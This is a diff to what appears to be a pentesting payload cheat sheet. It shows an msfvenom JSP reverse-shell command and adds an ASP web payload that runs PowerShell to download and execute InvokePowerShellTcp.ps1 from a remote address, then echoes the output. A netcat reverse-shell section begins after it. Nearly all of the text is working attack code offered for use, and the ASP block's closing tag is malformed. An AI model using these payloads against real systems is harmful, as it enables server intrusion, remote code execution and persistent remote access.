@@ -99,6 +99,16 @@ x64
 > msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f war > shell.war
 ```
 
+###### Simple ASP(X?) payload without importing additional libraries
+```
+<%
+Set s = CreateObject("WScript.Shell")
+Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.10.10:80/InvokePowerShellTcp.ps1')")
+o = cmd.StdOut.Readall()
+Response.write(o)
+>
+```
+
 ###### Netcat reverse shell
 ```
 Set up a listener
